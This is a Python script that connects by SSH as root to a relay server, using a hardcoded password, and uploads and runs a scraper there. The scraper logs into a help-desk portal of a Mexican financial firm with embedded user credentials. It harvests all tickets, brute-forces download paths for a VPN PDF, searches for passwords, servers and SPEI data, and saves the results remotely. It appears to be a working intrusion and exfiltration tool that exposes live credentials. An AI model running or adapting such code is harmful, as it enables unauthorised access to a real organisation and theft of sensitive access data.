import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re, time
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA})
PAO = "https://pao.findep.com.mx"

# LOGIN
r_login = s.post(f"{PAO}/MRcgi/MRlogin.pl",
    data={"USER": "bmendezar", "PASSWORD": "Pao1234+", "USERID": "bmendezar",
          "MRSubmit": "Submit", "PROJECTID": "1", "LASTSTEP": "1"},
    timeout=20, allow_redirects=True)
mrp = re.search(r'NAME=MRP\s+VALUE="([^"]+)"', r_login.text)
MRP = mrp.group(1) if mrp else ""

# Follow redirect (required for session)
params_full = {
    "CUSTM": "bmendezar", "USER": "bmendezar", "PROJECTID": "50",
    "WRITECACHE": "1", "CUSTUSER": "on", "MRP": MRP,
    "FIRST_TIME_IN_FP": "1", "FIRST_TIME_IN_PROJ": "1",
    "USERID": "bmendezar", "MRSubmit": "Submit", "LASTSTEP": "1",
}
r_home = s.get(f"{PAO}/MRcgi/MRhomepage.pl", params=params_full, timeout=60)
sys.stdout.write(f"Homepage: {len(r_home.text)}b, MRP={MRP}\n\n")

SP = f"USER=bmendezar&MRP={MRP}&PROJECTID=50&CUSTM=bmendezar"

# Extract full ticket data
td_match = re.search(r'var\s+ticketData\s*=\s*(\{.*?\});', r_home.text, re.S)
tickets_json = []
if td_match:
    try:
        data = json.loads(td_match.group(1))
        tickets_json = data.get("rows", [])
    except:
        pass

sys.stdout.write(f"Tickets: {len(tickets_json)}\n\n")

# ========================================
# 1. EXTRACT ROW IDS AND TICKET INFO
# ========================================
sys.stdout.write("=" * 60 + "\n=== ALL TICKET DETAILS ===\n" + "=" * 60 + "\n\n")

for i, t in enumerate(tickets_json):
    rid = t.get("rowId", "?")
    title_raw = t.get("actualTitleText", "?")
    title_clean = title_raw.split(":::")[0] if ":::" in title_raw else title_raw
    description = title_raw.split(":::")[1] if ":::" in title_raw else ""
    status = t.get("status", "?")
    priority = re.sub(r'<[^>]+>', '', t.get("priority", "?")).strip()
    attachment = t.get("attachment", "")
    when = t.get("datetimeago", "?")
    
    sys.stdout.write(f"\n[{i+1}] ID: {rid} | Status: {status} | Priority: {priority} | {when}\n")
    sys.stdout.write(f"    Title: {title_clean[:100]}\n")
    if description:
        decoded = description.replace("&oacute;", "ó").replace("&aacute;", "á").replace("&eacute;", "é").replace("&#58;", ":").replace("&ntilde;", "ñ")
        sys.stdout.write(f"    Desc: {decoded[:200]}\n")
    if attachment:
        sys.stdout.write(f"    *** ATTACHMENT: {attachment} ***\n")
    
    # Try to read this ticket
    tid = rid.split("_")[0] if "_" in rid else rid
    try:
        # Method 1: MRTicketPage.pl with full params
        r_t = s.get(f"{PAO}/MRcgi/MRTicketPage.pl?{SP}&MESSION={tid}&LASTID={tid}&DOWHAT=HOME", timeout=10)
        is_error = "Error de inicio" in r_t.text[:3000] or "MRlogin" in r_t.text[:3000]
        
        if not is_error and len(r_t.text) > 25000:
            sys.stdout.write(f"    *** TICKET ACCESSIBLE: {len(r_t.text)}b ***\n")
            # Save it
            with open(f'/root/fp_ticket_{tid}.html', 'w') as f:
                f.write(r_t.text)
        
        # Method 2: Direct MRticketBody.pl
        r_t2 = s.get(f"{PAO}/MRcgi/MRticketBody.pl?{SP}&ESSION={tid}", timeout=10)
        is_error2 = "Error de inicio" in r_t2.text[:3000]
        if not is_error2 and len(r_t2.text) > 25000:
            sys.stdout.write(f"    *** TICKET BODY ACCESSIBLE: {len(r_t2.text)}b ***\n")
    except:
        pass


# ========================================
# 2. TRY TO DOWNLOAD VPN PDF
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== VPN PDF DOWNLOAD ===\n" + "=" * 60 + "\n\n")

# The PDF "clara vpn.pdf" is in one of the tickets
# Try various download paths
pdf_paths = [
    f"/MRcgi/MRgetAttachment.pl?{SP}&FILENAME=clara+vpn.pdf",
    f"/MRcgi/MRgetAttachment.pl?{SP}&FILE=clara+vpn.pdf",
    f"/MRcgi/MRgetFile.pl?{SP}&FILE=clara+vpn.pdf",
    f"/MRcgi/MRdownload.pl?{SP}&FILENAME=clara+vpn.pdf",
    f"/MRcgi/MRfiledownload.pl?{SP}&FILENAME=clara+vpn.pdf",
    f"/MRcgi/MRcontent.pl?{SP}&FILENAME=clara+vpn.pdf",
    f"/tmp/clara+vpn.pdf",
    f"/attachments/clara+vpn.pdf",
    f"/MRcgi/MRgetAttachment.pl?{SP}&MESSION=1137712&FILENAME=clara+vpn.pdf",
]

for pp in pdf_paths:
    try:
        r_pdf = s.get(f"{PAO}{pp}", timeout=10)
        ct = r_pdf.headers.get("content-type", "")
        sys.stdout.write(f"  [{r_pdf.status_code}] ({len(r_pdf.content)}b) ct={ct[:30]} — {pp.split('?')[0]}\n")
        
        if "pdf" in ct.lower() or (r_pdf.status_code == 200 and r_pdf.content[:4] == b'%PDF'):
            with open('/root/clara_vpn.pdf', 'wb') as f:
                f.write(r_pdf.content)
            sys.stdout.write(f"    *** PDF SAVED: {len(r_pdf.content)}b ***\n")
    except:
        pass
    sys.stdout.flush()


# ========================================
# 3. NAMP SEARCH (returned 56KB before)
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== NAMP SEARCH RESULTS ===\n" + "=" * 60 + "\n\n")

for term in ["VPN", "password", "servidor", "SPEI", "base datos", "produccion", "acceso"]:
    r_namp = s.get(f"{PAO}/MRcgi/MRNampSearchResults.pl?{SP}&SEARCHTERMS={term}&LASTID=20563",
        timeout=15)
    
    if r_namp.status_code == 200 and len(r_namp.text) > 5000:
        # Check if it has content (not just CSS/error)
        has_content = "actualTitleText" in r_namp.text or "homepageRow" in r_namp.text
        
        if has_content:
            titles = re.findall(r'"actualTitleText":"(.*?)"', r_namp.text)
            sys.stdout.write(f"\n  '{term}': {len(r_namp.text)}b, {len(titles)} results\n")
            for t in titles[:10]:
                decoded = t.encode().decode('unicode_escape', errors='replace')[:100]
                sys.stdout.write(f"    - {decoded}\n")
        else:
            sys.stdout.write(f"  '{term}': {len(r_namp.text)}b (no content)\n")
    sys.stdout.flush()


# ========================================
# 4. EXPLORE TICKET ATTACHMENTS DIRECTORY
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== ATTACHMENT PATHS ===\n" + "=" * 60 + "\n\n")

# Search the homepage HTML for attachment-related URLs
att_links = re.findall(r'(?:attachment|file|download|pdf|doc)[^"\']*', r_home.text, re.I)
sys.stdout.write(f"Attachment references: {len(att_links)}\n")
for al in sorted(set(att_links))[:20]:
    sys.stdout.write(f"  {al[:100]}\n")

# Look for the ticket that has the VPN PDF
for i, t in enumerate(tickets_json):
    if t.get("attachment"):
        sys.stdout.write(f"\nTicket with attachment: ID={t['rowId']} att={t['attachment']}\n")
        
        # Look for the title link to extract the ticket URL
        title_html = t.get("title", "")
        tid_match = re.search(r'MESSION=(\d+)', title_html)
        if tid_match:
            tid = tid_match.group(1)
            sys.stdout.write(f"  Ticket ID from title: {tid}\n")
            
            # Try to get attachment via ticket
            att_url = f"{PAO}/MRcgi/MRgetAttachment.pl?{SP}&MESSION={tid}&FILENAME={t['attachment'].replace(' ', '+')}"
            r_att = s.get(att_url, timeout=10)
            sys.stdout.write(f"  Attachment: [{r_att.status_code}] ({len(r_att.content)}b) ct={r_att.headers.get('content-type','')[:30]}\n")
            
            if r_att.status_code == 200 and len(r_att.content) > 100:
                with open(f'/root/fp_attachment_{tid}.pdf', 'wb') as f:
                    f.write(r_att.content)
                sys.stdout.write(f"  *** SAVED ***\n")

# Extract the full row data for the VPN ticket
sys.stdout.write("\n\n--- Full JSON of ticket with attachment ---\n")
for t in tickets_json:
    if t.get("attachment"):
        sys.stdout.write(json.dumps(t, indent=2, ensure_ascii=False)[:2000] + "\n")


sys.stdout.write("\n\n=== ALL DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/fp_vpn_extract.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/fp_vpn_extract.py 2>&1', timeout=120)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
